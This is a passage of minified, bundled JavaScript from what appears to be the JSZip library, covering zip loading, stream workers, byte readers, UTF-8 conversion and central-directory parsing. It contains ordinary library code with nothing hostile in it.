o=t("./utils"),a=t("./external"),n=t("./utf8"),c=t("./zipEntries"),p=t("./stream/Crc32Probe"),v=t("./nodejsUtils");function d(f){return new a.Promise(function(h,m){var g=f.decompressed.getContentWorker().pipe(new p);g.on("error",function(y){m(y)}).on("end",function(){g.streamInfo.crc32!==f.decompressed.crc32?m(new Error("Corrupted zip : CRC32 mismatch")):h()}).resume()})}s.exports=function(f,h){var m=this;return h=o.extend(h||{},{base64:!1,checkCRC32:!1,optimizedBinaryString:!1,createFolders:!1,decodeFileName:n.utf8decode}),v.isNode&&v.isStream(f)?a.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")):o.prepareContent("the loaded zip file",f,!0,h.optimizedBinaryString,h.base64).then(function(g){var y=new c(h);return y.load(g),y}).then(function(g){var y=[a.Promise.resolve(g)],b=g.files;if(h.checkCRC32)for(var k=0;k<b.length;k++)y.push(d(b[k]));return a.Promise.all(y)}).then(function(g){for(var y=g.shift(),b=y.files,k=0;k<b.length;k++){var x=b[k],I=x.fileNameStr,z=o.resolve(x.fileNameStr);m.file(z,x.decompressed,{binary:!0,optimizedBinaryString:!0,date:x.date,dir:x.dir,comment:x.fileCommentStr.length?x.fileCommentStr:null,unixPermissions:x.unixPermissions,dosPermissions:x.dosPermissions,createFolders:h.createFolders}),x.dir||(m.file(z).unsafeOriginalName=I)}return y.zipComment.length&&(m.comment=y.zipComment),m})}},{"./external":6,"./nodejsUtils":14,"./stream/Crc32Probe":25,"./utf8":31,"./utils":32,"./zipEntries":33}],12:[function(t,s,r){var o=t("../utils"),a=t("../stream/GenericWorker");function n(c,p){a.call(this,"Nodejs stream input adapter for "+c),this._upstreamEnded=!1,this._bindStream(p)}o.inherits(n,a),n.prototype._bindStream=function(c){var p=this;(this._stream=c).pause(),c.on("data",function(v){p.push({data:v,meta:{percent:0}})}).on("error",function(v){p.isPaused?this.generatedError=v:p.error(v)}).on("end",function(){p.isPaused?p._upstreamEnded=!0:p.end()})},n.prototype.pause=function(){return!!a.prototype.pause.call(this)&&(this._stream.pause(),!0)},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(this._upstreamEnded?this.end():this._stream.resume(),!0)},s.exports=n},{"../stream/GenericWorker":28,"../utils":32}],13:[function(t,s,r){var o=t("readable-stream").Readable;function a(n,c,p){o.call(this,c),this._helper=n;var v=this;n.on("data",function(d,f){v.push(d)||v._helper.pause(),p&&p(f)}).on("error",function(d){v.emit("error",d)}).on("end",function(){v.push(null)})}t("../utils").inherits(a,o),a.prototype._read=function(){this._helper.resume()},s.exports=a},{"../utils":32,"readable-stream":16}],14:[function(t,s,r){s.exports={isNode:typeof Buffer<"u",newBufferFrom:function(o,a){if(Buffer.from&&Buffer.from!==Uint8Array.from)return Buffer.from(o,a);if(typeof o=="number")throw new Error('The "data" argument must not be a number');return new Buffer(o,a)},allocBuffer:function(o){if(Buffer.alloc)return Buffer.alloc(o);var a=new Buffer(o);return a.fill(0),a},isBuffer:function(o){return Buffer.isBuffer(o)},isStream:function(o){return o&&typeof o.on=="function"&&typeof o.pause=="function"&&typeof o.resume=="function"}}},{}],15:[function(t,s,r){function o(z,R,O){var j,P=n.getTypeOf(R),N=n.extend(O||{},v);N.date=N.date||new Date,N.compression!==null&&(N.compression=N.compression.toUpperCase()),typeof N.unixPermissions=="string"&&(N.unixPermissions=parseInt(N.unixPermissions,8)),N.unixPermissions&&16384&N.unixPermissions&&(N.dir=!0),N.dosPermissions&&16&N.dosPermissions&&(N.dir=!0),N.dir&&(z=b(z)),N.createFolders&&(j=y(z))&&k.call(this,j,!0);var Y=P==="string"&&N.binary===!1&&N.base64===!1;O&&O.binary!==void 0||(N.binary=!Y),(R instanceof d&&R.uncompressedSize===0||N.dir||!R||R.length===0)&&(N.base64=!1,N.binary=!0,R="",N.compression="STORE",P="string");var S=null;S=R instanceof d||R instanceof c?R:m.isNode&&m.isStream(R)?new g(z,R):n.prepareContent(z,R,N.binary,N.optimizedBinaryString,N.base64);var H=new f(z,S,N);this.files[z]=H}var a=t("./utf8"),n=t("./utils"),c=t("./stream/GenericWorker"),p=t("./stream/StreamHelper"),v=t("./defaults"),d=t("./compressedObject"),f=t("./zipObject"),h=t("./generate"),m=t("./nodejsUtils"),g=t("./nodejs/NodejsStreamInputAdapter"),y=function(z){z.slice(-1)==="/"&&(z=z.substring(0,z.length-1));var R=z.lastIndexOf("/");return 0<R?z.substring(0,R):""},b=function(z){return z.slice(-1)!=="/"&&(z+="/"),z},k=function(z,R){return R=R!==void 0?R:v.createFolders,z=b(z),this.files[z]||o.call(this,z,null,{dir:!0,createFolders:R}),this.files[z]};function x(z){return Object.prototype.toString.call(z)==="[object RegExp]"}var I={load:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},forEach:function(z){var R,O,j;for(R in this.files)j=this.files[R],(O=R.slice(this.root.length,R.length))&&R.slice(0,this.root.length)===this.root&&z(O,j)},filter:function(z){var R=[];return this.forEach(function(O,j){z(O,j)&&R.push(j)}),R},file:function(z,R,O){if(arguments.length!==1)return z=this.root+z,o.call(this,z,R,O),this;if(x(z)){var j=z;return this.filter(function(N,Y){return!Y.dir&&j.test(N)})}var P=this.files[this.root+z];return P&&!P.dir?P:null},folder:function(z){if(!z)return this;if(x(z))return this.filter(function(P,N){return N.dir&&z.test(P)});var R=this.root+z,O=k.call(this,R),j=this.clone();return j.root=O.name,j},remove:function(z){z=this.root+z;var R=this.files[z];if(R||(z.slice(-1)!=="/"&&(z+="/"),R=this.files[z]),R&&!R.dir)delete this.files[z];else for(var O=this.filter(function(P,N){return N.name.slice(0,z.length)===z}),j=0;j<O.length;j++)delete this.files[O[j].name];return this},generate:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},generateInternalStream:function(z){var R,O={};try{if((O=n.extend(z||{},{streamFiles:!1,compression:"STORE",compressionOptions:null,type:"",platform:"DOS",comment:null,mimeType:"application/zip",encodeFileName:a.utf8encode})).type=O.type.toLowerCase(),O.compression=O.compression.toUpperCase(),O.type==="binarystring"&&(O.type="string"),!O.type)throw new Error("No output type specified.");n.checkSupport(O.type),O.platform!=="darwin"&&O.platform!=="freebsd"&&O.platform!=="linux"&&O.platform!=="sunos"||(O.platform="UNIX"),O.platform==="win32"&&(O.platform="DOS");var j=O.comment||this.comment||"";R=h.generateWorker(this,O,j)}catch(P){(R=new c("error")).error(P)}return new p(R,O.type||"string",O.mimeType)},generateAsync:function(z,R){return this.generateInternalStream(z).accumulate(R)},generateNodeStream:function(z,R){return(z=z||{}).type||(z.type="nodebuffer"),this.generateInternalStream(z).toNodejsStream(R)}};s.exports=I},{"./compressedObject":2,"./defaults":5,"./generate":9,"./nodejs/NodejsStreamInputAdapter":12,"./nodejsUtils":14,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31,"./utils":32,"./zipObject":35}],16:[function(t,s,r){s.exports=t("stream")},{stream:void 0}],17:[function(t,s,r){var o=t("./DataReader");function a(n){o.call(this,n);for(var c=0;c<this.data.length;c++)n[c]=255&n[c]}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data[this.zero+n]},a.prototype.lastIndexOfSignature=function(n){for(var c=n.charCodeAt(0),p=n.charCodeAt(1),v=n.charCodeAt(2),d=n.charCodeAt(3),f=this.length-4;0<=f;--f)if(this.data[f]===c&&this.data[f+1]===p&&this.data[f+2]===v&&this.data[f+3]===d)return f-this.zero;return-1},a.prototype.readAndCheckSignature=function(n){var c=n.charCodeAt(0),p=n.charCodeAt(1),v=n.charCodeAt(2),d=n.charCodeAt(3),f=this.readData(4);return c===f[0]&&p===f[1]&&v===f[2]&&d===f[3]},a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return[];var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},s.exports=a},{"../utils":32,"./DataReader":18}],18:[function(t,s,r){var o=t("../utils");function a(n){this.data=n,this.length=n.length,this.index=0,this.zero=0}a.prototype={checkOffset:function(n){this.checkIndex(this.index+n)},checkIndex:function(n){if(this.length<this.zero+n||n<0)throw new Error("End of data reached (data length = "+this.length+", asked index = "+n+"). Corrupted zip ?")},setIndex:function(n){this.checkIndex(n),this.index=n},skip:function(n){this.setIndex(this.index+n)},byteAt:function(){},readInt:function(n){var c,p=0;for(this.checkOffset(n),c=this.index+n-1;c>=this.index;c--)p=(p<<8)+this.byteAt(c);return this.index+=n,p},readString:function(n){return o.transformTo("string",this.readData(n))},readData:function(){},lastIndexOfSignature:function(){},readAndCheckSignature:function(){},readDate:function(){var n=this.readInt(4);return new Date(Date.UTC(1980+(n>>25&127),(n>>21&15)-1,n>>16&31,n>>11&31,n>>5&63,(31&n)<<1))}},s.exports=a},{"../utils":32}],19:[function(t,s,r){var o=t("./Uint8ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){this.checkOffset(n);var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},s.exports=a},{"../utils":32,"./Uint8ArrayReader":21}],20:[function(t,s,r){var o=t("./DataReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data.charCodeAt(this.zero+n)},a.prototype.lastIndexOfSignature=function(n){return this.data.lastIndexOf(n)-this.zero},a.prototype.readAndCheckSignature=function(n){return n===this.readData(4)},a.prototype.readData=function(n){this.checkOffset(n);var c=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},s.exports=a},{"../utils":32,"./DataReader":18}],21:[function(t,s,r){var o=t("./ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return new Uint8Array(0);var c=this.data.subarray(this.zero+this.index,this.zero+this.index+n);return this.index+=n,c},s.exports=a},{"../utils":32,"./ArrayReader":17}],22:[function(t,s,r){var o=t("../utils"),a=t("../support"),n=t("./ArrayReader"),c=t("./StringReader"),p=t("./NodeBufferReader"),v=t("./Uint8ArrayReader");s.exports=function(d){var f=o.getTypeOf(d);return o.checkSupport(f),f!=="string"||a.uint8array?f==="nodebuffer"?new p(d):a.uint8array?new v(o.transformTo("uint8array",d)):new n(o.transformTo("array",d)):new c(d)}},{"../support":30,"../utils":32,"./ArrayReader":17,"./NodeBufferReader":19,"./StringReader":20,"./Uint8ArrayReader":21}],23:[function(t,s,r){r.LOCAL_FILE_HEADER="PK",r.CENTRAL_FILE_HEADER="PK",r.CENTRAL_DIRECTORY_END="PK",r.ZIP64_CENTRAL_DIRECTORY_LOCATOR="PK\x07",r.ZIP64_CENTRAL_DIRECTORY_END="PK",r.DATA_DESCRIPTOR="PK\x07\b"},{}],24:[function(t,s,r){var o=t("./GenericWorker"),a=t("../utils");function n(c){o.call(this,"ConvertWorker to "+c),this.destType=c}a.inherits(n,o),n.prototype.processChunk=function(c){this.push({data:a.transformTo(this.destType,c.data),meta:c.meta})},s.exports=n},{"../utils":32,"./GenericWorker":28}],25:[function(t,s,r){var o=t("./GenericWorker"),a=t("../crc32");function n(){o.call(this,"Crc32Probe"),this.withStreamInfo("crc32",0)}t("../utils").inherits(n,o),n.prototype.processChunk=function(c){this.streamInfo.crc32=a(c.data,this.streamInfo.crc32||0),this.push(c)},s.exports=n},{"../crc32":4,"../utils":32,"./GenericWorker":28}],26:[function(t,s,r){var o=t("../utils"),a=t("./GenericWorker");function n(c){a.call(this,"DataLengthProbe for "+c),this.propName=c,this.withStreamInfo(c,0)}o.inherits(n,a),n.prototype.processChunk=function(c){if(c){var p=this.streamInfo[this.propName]||0;this.streamInfo[this.propName]=p+c.data.length}a.prototype.processChunk.call(this,c)},s.exports=n},{"../utils":32,"./GenericWorker":28}],27:[function(t,s,r){var o=t("../utils"),a=t("./GenericWorker");function n(c){a.call(this,"DataWorker");var p=this;this.dataIsReady=!1,this.index=0,this.max=0,this.data=null,this.type="",this._tickScheduled=!1,c.then(function(v){p.dataIsReady=!0,p.data=v,p.max=v&&v.length||0,p.type=o.getTypeOf(v),p.isPaused||p._tickAndRepeat()},function(v){p.error(v)})}o.inherits(n,a),n.prototype.cleanUp=function(){a.prototype.cleanUp.call(this),this.data=null},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(!this._tickScheduled&&this.dataIsReady&&(this._tickScheduled=!0,o.delay(this._tickAndRepeat,[],this)),!0)},n.prototype._tickAndRepeat=function(){this._tickScheduled=!1,this.isPaused||this.isFinished||(this._tick(),this.isFinished||(o.delay(this._tickAndRepeat,[],this),this._tickScheduled=!0))},n.prototype._tick=function(){if(this.isPaused||this.isFinished)return!1;var c=null,p=Math.min(this.max,this.index+16384);if(this.index>=this.max)return this.end();switch(this.type){case"string":c=this.data.substring(this.index,p);break;case"uint8array":c=this.data.subarray(this.index,p);break;case"array":case"nodebuffer":c=this.data.slice(this.index,p)}return this.index=p,this.push({data:c,meta:{percent:this.max?this.index/this.max*100:0}})},s.exports=n},{"../utils":32,"./GenericWorker":28}],28:[function(t,s,r){function o(a){this.name=a||"default",this.streamInfo={},this.generatedError=null,this.extraStreamInfo={},this.isPaused=!0,this.isFinished=!1,this.isLocked=!1,this._listeners={data:[],end:[],error:[]},this.previous=null}o.prototype={push:function(a){this.emit("data",a)},end:function(){if(this.isFinished)return!1;this.flush();try{this.emit("end"),this.cleanUp(),this.isFinished=!0}catch(a){this.emit("error",a)}return!0},error:function(a){return!this.isFinished&&(this.isPaused?this.generatedError=a:(this.isFinished=!0,this.emit("error",a),this.previous&&this.previous.error(a),this.cleanUp()),!0)},on:function(a,n){return this._listeners[a].push(n),this},cleanUp:function(){this.streamInfo=this.generatedError=this.extraStreamInfo=null,this._listeners=[]},emit:function(a,n){if(this._listeners[a])for(var c=0;c<this._listeners[a].length;c++)this._listeners[a][c].call(this,n)},pipe:function(a){return a.registerPrevious(this)},registerPrevious:function(a){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.streamInfo=a.streamInfo,this.mergeStreamInfo(),this.previous=a;var n=this;return a.on("data",function(c){n.processChunk(c)}),a.on("end",function(){n.end()}),a.on("error",function(c){n.error(c)}),this},pause:function(){return!this.isPaused&&!this.isFinished&&(this.isPaused=!0,this.previous&&this.previous.pause(),!0)},resume:function(){if(!this.isPaused||this.isFinished)return!1;var a=this.isPaused=!1;return this.generatedError&&(this.error(this.generatedError),a=!0),this.previous&&this.previous.resume(),!a},flush:function(){},processChunk:function(a){this.push(a)},withStreamInfo:function(a,n){return this.extraStreamInfo[a]=n,this.mergeStreamInfo(),this},mergeStreamInfo:function(){for(var a in this.extraStreamInfo)Object.prototype.hasOwnProperty.call(this.extraStreamInfo,a)&&(this.streamInfo[a]=this.extraStreamInfo[a])},lock:function(){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.isLocked=!0,this.previous&&this.previous.lock()},toString:function(){var a="Worker "+this.name;return this.previous?this.previous+" -> "+a:a}},s.exports=o},{}],29:[function(t,s,r){var o=t("../utils"),a=t("./ConvertWorker"),n=t("./GenericWorker"),c=t("../base64"),p=t("../support"),v=t("../external"),d=null;if(p.nodestream)try{d=t("../nodejs/NodejsStreamOutputAdapter")}catch{}function f(m,g){return new v.Promise(function(y,b){var k=[],x=m._internalType,I=m._outputType,z=m._mimeType;m.on("data",function(R,O){k.push(R),g&&g(O)}).on("error",function(R){k=[],b(R)}).on("end",function(){try{var R=(function(O,j,P){switch(O){case"blob":return o.newBlob(o.transformTo("arraybuffer",j),P);case"base64":return c.encode(j);default:return o.transformTo(O,j)}})(I,(function(O,j){var P,N=0,Y=null,S=0;for(P=0;P<j.length;P++)S+=j[P].length;switch(O){case"string":return j.join("");case"array":return Array.prototype.concat.apply([],j);case"uint8array":for(Y=new Uint8Array(S),P=0;P<j.length;P++)Y.set(j[P],N),N+=j[P].length;return Y;case"nodebuffer":return Buffer.concat(j);default:throw new Error("concat : unsupported type '"+O+"'")}})(x,k),z);y(R)}catch(O){b(O)}k=[]}).resume()})}function h(m,g,y){var b=g;switch(g){case"blob":case"arraybuffer":b="uint8array";break;case"base64":b="string"}try{this._internalType=b,this._outputType=g,this._mimeType=y,o.checkSupport(b),this._worker=m.pipe(new a(b)),m.lock()}catch(k){this._worker=new n("error"),this._worker.error(k)}}h.prototype={accumulate:function(m){return f(this,m)},on:function(m,g){var y=this;return m==="data"?this._worker.on(m,function(b){g.call(y,b.data,b.meta)}):this._worker.on(m,function(){o.delay(g,arguments,y)}),this},resume:function(){return o.delay(this._worker.resume,[],this._worker),this},pause:function(){return this._worker.pause(),this},toNodejsStream:function(m){if(o.checkSupport("nodestream"),this._outputType!=="nodebuffer")throw new Error(this._outputType+" is not supported by this method");return new d(this,{objectMode:this._outputType!=="nodebuffer"},m)}},s.exports=h},{"../base64":1,"../external":6,"../nodejs/NodejsStreamOutputAdapter":13,"../support":30,"../utils":32,"./ConvertWorker":24,"./GenericWorker":28}],30:[function(t,s,r){if(r.base64=!0,r.array=!0,r.string=!0,r.arraybuffer=typeof ArrayBuffer<"u"&&typeof Uint8Array<"u",r.nodebuffer=typeof Buffer<"u",r.uint8array=typeof Uint8Array<"u",typeof ArrayBuffer>"u")r.blob=!1;else{var o=new ArrayBuffer(0);try{r.blob=new Blob([o],{type:"application/zip"}).size===0}catch{try{var a=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);a.append(o),r.blob=a.getBlob("application/zip").size===0}catch{r.blob=!1}}}try{r.nodestream=!!t("readable-stream").Readable}catch{r.nodestream=!1}},{"readable-stream":16}],31:[function(t,s,r){for(var o=t("./utils"),a=t("./support"),n=t("./nodejsUtils"),c=t("./stream/GenericWorker"),p=new Array(256),v=0;v<256;v++)p[v]=252<=v?6:248<=v?5:240<=v?4:224<=v?3:192<=v?2:1;p[254]=p[254]=1;function d(){c.call(this,"utf-8 decode"),this.leftOver=null}function f(){c.call(this,"utf-8 encode")}r.utf8encode=function(h){return a.nodebuffer?n.newBufferFrom(h,"utf-8"):(function(m){var g,y,b,k,x,I=m.length,z=0;for(k=0;k<I;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<I&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),z+=y<128?1:y<2048?2:y<65536?3:4;for(g=a.uint8array?new Uint8Array(z):new Array(z),k=x=0;x<z;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<I&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),y<128?g[x++]=y:(y<2048?g[x++]=192|y>>>6:(y<65536?g[x++]=224|y>>>12:(g[x++]=240|y>>>18,g[x++]=128|y>>>12&63),g[x++]=128|y>>>6&63),g[x++]=128|63&y);return g})(h)},r.utf8decode=function(h){return a.nodebuffer?o.transformTo("nodebuffer",h).toString("utf-8"):(function(m){var g,y,b,k,x=m.length,I=new Array(2*x);for(g=y=0;g<x;)if((b=m[g++])<128)I[y++]=b;else if(4<(k=p[b]))I[y++]=65533,g+=k-1;else{for(b&=k===2?31:k===3?15:7;1<k&&g<x;)b=b<<6|63&m[g++],k--;1<k?I[y++]=65533:b<65536?I[y++]=b:(b-=65536,I[y++]=55296|b>>10&1023,I[y++]=56320|1023&b)}return I.length!==y&&(I.subarray?I=I.subarray(0,y):I.length=y),o.applyFromCharCode(I)})(h=o.transformTo(a.uint8array?"uint8array":"array",h))},o.inherits(d,c),d.prototype.processChunk=function(h){var m=o.transformTo(a.uint8array?"uint8array":"array",h.data);if(this.leftOver&&this.leftOver.length){if(a.uint8array){var g=m;(m=new Uint8Array(g.length+this.leftOver.length)).set(this.leftOver,0),m.set(g,this.leftOver.length)}else m=this.leftOver.concat(m);this.leftOver=null}var y=(function(k,x){var I;for((x=x||k.length)>k.length&&(x=k.length),I=x-1;0<=I&&(192&k[I])==128;)I--;return I<0||I===0?x:I+p[k[I]]>x?I:x})(m),b=m;y!==m.length&&(a.uint8array?(b=m.subarray(0,y),this.leftOver=m.subarray(y,m.length)):(b=m.slice(0,y),this.leftOver=m.slice(y,m.length))),this.push({data:r.utf8decode(b),meta:h.meta})},d.prototype.flush=function(){this.leftOver&&this.leftOver.length&&(this.push({data:r.utf8decode(this.leftOver),meta:{}}),this.leftOver=null)},r.Utf8DecodeWorker=d,o.inherits(f,c),f.prototype.processChunk=function(h){this.push({data:r.utf8encode(h.data),meta:h.meta})},r.Utf8EncodeWorker=f},{"./nodejsUtils":14,"./stream/GenericWorker":28,"./support":30,"./utils":32}],32:[function(t,s,r){var o=t("./support"),a=t("./base64"),n=t("./nodejsUtils"),c=t("./external");function p(g){return g}function v(g,y){for(var b=0;b<g.length;++b)y[b]=255&g.charCodeAt(b);return y}t("setimmediate"),r.newBlob=function(g,y){r.checkSupport("blob");try{return new Blob([g],{type:y})}catch{try{var b=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);return b.append(g),b.getBlob(y)}catch{throw new Error("Bug : can't construct the Blob.")}}};var d={stringifyByChunk:function(g,y,b){var k=[],x=0,I=g.length;if(I<=b)return String.fromCharCode.apply(null,g);for(;x<I;)y==="array"||y==="nodebuffer"?k.push(String.fromCharCode.apply(null,g.slice(x,Math.min(x+b,I)))):k.push(String.fromCharCode.apply(null,g.subarray(x,Math.min(x+b,I)))),x+=b;return k.join("")},stringifyByChar:function(g){for(var y="",b=0;b<g.length;b++)y+=String.fromCharCode(g[b]);return y},applyCanBeUsed:{uint8array:(function(){try{return o.uint8array&&String.fromCharCode.apply(null,new Uint8Array(1)).length===1}catch{return!1}})(),nodebuffer:(function(){try{return o.nodebuffer&&String.fromCharCode.apply(null,n.allocBuffer(1)).length===1}catch{return!1}})()}};function f(g){var y=65536,b=r.getTypeOf(g),k=!0;if(b==="uint8array"?k=d.applyCanBeUsed.uint8array:b==="nodebuffer"&&(k=d.applyCanBeUsed.nodebuffer),k)for(;1<y;)try{return d.stringifyByChunk(g,b,y)}catch{y=Math.floor(y/2)}return d.stringifyByChar(g)}function h(g,y){for(var b=0;b<g.length;b++)y[b]=g[b];return y}r.applyFromCharCode=f;var m={};m.string={string:p,array:function(g){return v(g,new Array(g.length))},arraybuffer:function(g){return m.string.uint8array(g).buffer},uint8array:function(g){return v(g,new Uint8Array(g.length))},nodebuffer:function(g){return v(g,n.allocBuffer(g.length))}},m.array={string:f,array:p,arraybuffer:function(g){return new Uint8Array(g).buffer},uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(g)}},m.arraybuffer={string:function(g){return f(new Uint8Array(g))},array:function(g){return h(new Uint8Array(g),new Array(g.byteLength))},arraybuffer:p,uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(new Uint8Array(g))}},m.uint8array={string:f,array:function(g){return h(g,new Array(g.length))},arraybuffer:function(g){return g.buffer},uint8array:p,nodebuffer:function(g){return n.newBufferFrom(g)}},m.nodebuffer={string:f,array:function(g){return h(g,new Array(g.length))},arraybuffer:function(g){return m.nodebuffer.uint8array(g).buffer},uint8array:function(g){return h(g,new Uint8Array(g.length))},nodebuffer:p},r.transformTo=function(g,y){if(y=y||"",!g)return y;r.checkSupport(g);var b=r.getTypeOf(y);return m[b][g](y)},r.resolve=function(g){for(var y=g.split("/"),b=[],k=0;k<y.length;k++){var x=y[k];x==="."||x===""&&k!==0&&k!==y.length-1||(x===".."?b.pop():b.push(x))}return b.join("/")},r.getTypeOf=function(g){return typeof g=="string"?"string":Object.prototype.toString.call(g)==="[object Array]"?"array":o.nodebuffer&&n.isBuffer(g)?"nodebuffer":o.uint8array&&g instanceof Uint8Array?"uint8array":o.arraybuffer&&g instanceof ArrayBuffer?"arraybuffer":void 0},r.checkSupport=function(g){if(!o[g.toLowerCase()])throw new Error(g+" is not supported by this platform")},r.MAX_VALUE_16BITS=65535,r.MAX_VALUE_32BITS=-1,r.pretty=function(g){var y,b,k="";for(b=0;b<(g||"").length;b++)k+="\\x"+((y=g.charCodeAt(b))<16?"0":"")+y.toString(16).toUpperCase();return k},r.delay=function(g,y,b){setImmediate(function(){g.apply(b||null,y||[])})},r.inherits=function(g,y){function b(){}b.prototype=y.prototype,g.prototype=new b},r.extend=function(){var g,y,b={};for(g=0;g<arguments.length;g++)for(y in arguments[g])Object.prototype.hasOwnProperty.call(arguments[g],y)&&b[y]===void 0&&(b[y]=arguments[g][y]);return b},r.prepareContent=function(g,y,b,k,x){return c.Promise.resolve(y).then(function(I){return o.blob&&(I instanceof Blob||["[object File]","[object Blob]"].indexOf(Object.prototype.toString.call(I))!==-1)&&typeof FileReader<"u"?new c.Promise(function(z,R){var O=new FileReader;O.onload=function(j){z(j.target.result)},O.onerror=function(j){R(j.target.error)},O.readAsArrayBuffer(I)}):I}).then(function(I){var z=r.getTypeOf(I);return z?(z==="arraybuffer"?I=r.transformTo("uint8array",I):z==="string"&&(x?I=a.decode(I):b&&k!==!0&&(I=(function(R){return v(R,o.uint8array?new Uint8Array(R.length):new Array(R.length))})(I))),I):c.Promise.reject(new Error("Can't read the data of '"+g+"'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"))})}},{"./base64":1,"./external":6,"./nodejsUtils":14,"./support":30,setimmediate:54}],33:[function(t,s,r){var o=t("./reader/readerFor"),a=t("./utils"),n=t("./signature"),c=t("./zipEntry"),p=t("./support");function v(d){this.files=[],this.loadOptions=d}v.prototype={checkSignature:function(d){if(!this.reader.readAndCheckSignature(d)){this.reader.index-=4;var f=this.reader.readString(4);throw new Error("Corrupted zip or bug: unexpected signature ("+a.pretty(f)+", expected "+a.pretty(d)+")")}},isSignature:function(d,f){var h=this.reader.index;this.reader.setIndex(d);var m=this.reader.readString(4)===f;return this.reader.setIndex(h),m},readBlockEndOfCentral:function(){this.diskNumber=this.reader.readInt(2),this.diskWithCentralDirStart=this.reader.readInt(2),this.centralDirRecordsOnThisDisk=this.reader.readInt(2),this.centralDirRecords=this.reader.readInt(2),this.centralDirSize=this.reader.readInt(4),this.centralDirOffset=this.reader.readInt(4),this.zipCommentLength=this.reader.readInt(2);var d=this.reader.readData(this.zipCommentLength),f=p.uint8array?"uint8array":"array",h=a.transformTo(f,d);this.zipComment=this.loadOptions.decodeFileName(h)},readBlockZip64EndOfCentral:function(){this.zip64EndOfCentralSize=this.reader.readInt(8),this.reader.skip(4),this.diskNumber=this.reader.readInt(4),this.diskWithCentralDirStart=this.reader.readInt(4),this.centralDirRecordsOnThisDisk=this.reader.readInt(8),this.centralDirRecords=this.reader.readInt(8),this.centralDirSize=this.reader.readInt(8),this.centralDirOffset=this.reader.readInt(8),this.zip64ExtensibleData={};for(var d,f,h,m=this.zip64EndOfCentralSize-44;0<m;)d=this.reader.readInt(2),f=this.reader.readInt(4),h=this.reader.readData(f),this.zip64ExtensibleData[d]={id:d,length:f,value:h}},readBlockZip64EndOfCentralLocator:function(){if(this.diskWithZip64CentralDirStart=this.reader.readInt(4),this.relativeOffsetEndOfZip64CentralDir=this.reader.readInt(8),this.disksCount=this.reader.readInt(4),1<this.disksCount)throw new Error("Multi-volumes zip are not supported")},readLocalFiles:function(){var d,f;for(d=0;d<this.files.length;d++)f=this.files[d],this.reader.setIndex(f.localHeaderOffset),this.checkSignature(n.LOCAL_FILE_HEADER),f.readLocalPart(this.reader),f.handleUTF8(),f.processAttributes()},readCentralDir:function(){var d;for(this.reader.setIndex(this.centralDirOffset);this.reader.readAndCheckSignature(n.CENTRAL_FILE_HEADER);)(d=new c({zip64:this.zip64},this.loadOptions)).readCentralPart(this.reader),this.files.push(d);if(this.centralDirRecords!==this.files.length&&this.centralDirRecords!==0&&this.files.length===0)throw new Error("Corrupted zip or bug: expected "+this.centralDirRecords+" records in central dir, got "+this.files.length)},readEndOfCentral:function(){var d=this.reader.lastIndexOfSignature(n.CENTRAL_DIRECTORY_END);if(d<0)throw this.isSignature(0,n.LOCAL_FILE_HEADER)?new Error("Corrupted zip: can't find end of central directory"):new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html");this.reader.setIndex(d);var f=d;if(this.checkSignature(n.CENTRAL_DIRECTORY_END),this.readBlockEndOfCentral(),this.diskNumber===a.MAX_VALUE_16BITS||this.diskWithCentralDirStart===a.MAX_VALUE_16BITS||this.centralDirRecordsOnThisDisk===a.MAX_VALUE_16BITS||this.centralDirRecords===a.MAX_VALUE_16BITS||this.centralDirSize===a.MAX_VALUE_32BITS||this.centralDirOffset===a.MAX_VALUE_32BITS){if(this.zip64=!0,(d=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR))<0)throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");if(this.reader.setIndex(d),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR),this.readBlockZip64EndOfCentralLocator(),!this.isSignature(this.relativeOffsetEndOfZip64CentralDir,n.ZIP64_CENTRAL_DIRECTORY_END)&&(this.relativeOffsetEndOfZip64CentralDir=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.relativeOffsetEndOfZip64CentralDir<0))throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.readBlockZip64EndOfCentral()}var h=this.centralDirOffset+this.centralDirSize;this.zip64&&(h+=20,h+=12+this.zip64EndOfCentralSize);var m=f-h;if(0<m)this.isSignature(f,n.CENTRAL_FILE_HEADER)||(this.reader.zero=m);else if(m<0)throw new Error("Corrupted zip: missing "+Math.abs(m)+" 